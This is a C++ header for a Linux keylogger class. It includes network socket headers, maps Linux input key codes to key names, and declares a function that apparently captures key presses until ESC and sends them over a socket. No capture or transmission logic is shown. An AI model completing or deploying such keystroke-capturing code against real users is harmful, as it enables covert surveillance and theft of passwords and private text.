#ifndef keylogger_h
#define keylogger_h

#include <iostream>
#include <string>
#include <map>
#include <vector>
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <netdb.h>
#include <sys/uio.h>
#include <sys/time.h>
#include <sys/wait.h>
#include <fstream>
#include <chrono>
#include <thread>
#include <map>
#include <fcntl.h>
#include <linux/input.h>
#include <unistd.h>

using namespace std;

class KeyLogger {
    public:
        map<int, string> MAP = {
            {0, "RESERVED"},
            {1, "ESC"},
            {2, "1"},
            {3, "2"},
            {4, "3"},
            {5, "4"},
            {6, "5"},
            {7, "6"},
            {8, "7"},
            {9, "8"},
            {10, "9"},
            {11, "0"},
            {12, "MINUS"},
            {13, "EQUAL"},
            {14, "BACKSPACE"},
            {15, "TAB"},
            {16, "Q"},
            {17, "W"},
            {18, "E"},
            {19, "R"},
            {20, "T"},
            {21, "Y"},
            {22, "U"},
            {23, "I"},
            {24, "O"},
            {25, "P"},
            {26, "LEFTBRACE"},
            {27, "RIGHTBRACE"},
            {28, "ENTER"},
            {29, "LEFTCTRL"},
            {30, "A"},
            {31, "S"},
            {32, "D"},
            {33, "F"},
            {34, "G"},
            {35, "H"},
            {36, "J"},
            {37, "K"},
            {38, "L"},
            {39, "SEMICOLON"},
            {40, "APOSTROPHE"},
            {41, "GRAVE"},
            {42, "LEFTSHIFT"},
            {43, "BACKSLASH"},
            {44, "Z"},
            {45, "X"},
            {46, "C"},
            {47, "V"},
            {48, "B"},
            {49, "N"},
            {50, "M"},
            {51, "COMMA"},
            {52, "DOT"},
            {53, "SLASH"},
            {54, "RIGHTSHIFT"},
            {55, "KPASTERISK"},
            {56, "LEFTALT"},
            {57, "SPACE"},
            {58, "CAPSLOCK"},
            {59, "F1"},
            {60, "F2"},
            {61, "F3"},
            {62, "F4"},
            {63, "F5"},
            {64, "F6"},
            {65, "F7"},
            {66, "F8"},
            {67, "F9"},
            {68, "F10"},
            {69, "NUMLOCK"},
            {70, "SCROLLLOCK"},
            {71, "KP7"},
            {72, "KP8"},
            {73, "KP9"},
            {74, "KPMINUS"},
            {75, "KP4"},
            {76, "KP5"},
            {77, "KP6"},
            {78, "KPPLUS"},
            {79, "KP1"},
            {80, "KP2"},
            {81, "KP3"},
            {82, "KP0"},
            {83, "KPDOT"},
            {85, "ZENKAKUHANKAKU"},
            {86, "102ND"},
            {87, "F11"},
            {88, "F12"},
            {89, "RO"},
            {90, "KATAKANA"},
            {91, "HIRAGANA"},
            {92, "HENKAN"},
            {93, "KATAKANAHIRAGANA"},
            {94, "MUHENKAN"},
            {95, "KPJPCOMMA"},
            {96, "KPENTER"},
            {97, "RIGHTCTRL"},
            {98, "KPSLASH"},
            {99, "SYSRQ"},
            {100, "RIGHTALT"},
            {101, "LINEFEED"},
            {102, "HOME"},
            {103, "UP"},
            {104, "PAGEUP"},
            {105, "LEFT"},
            {106, "RIGHT"},
            {107, "END"},
            {108, "DOWN"},
            {109, "PAGEDOWN"},
            {110, "INSERT"},
            {111, "DELETE"},
            {112, "MACRO"},
            {113, "MUTE"},
            {114, "VOLUMEDOWN"},
            {115, "VOLUMEUP"},
            {116, "POWER"},
            {117, "KPEQUAL"},
            {118, "KPPLUSMINUS"},
            {119, "PAUSE"},
            {120, "SCALE"},
            {121, "KPCOMMA"},
            {122, "HANGEUL"},
            {123, "HANJA"},
            {124, "YEN"},
            {125, "LEFTMETA"}    
        };

        static void catchKeyPressUntilESC(int newSd);
        //static void catchKey(int &newSd, int fd);
};


#endif

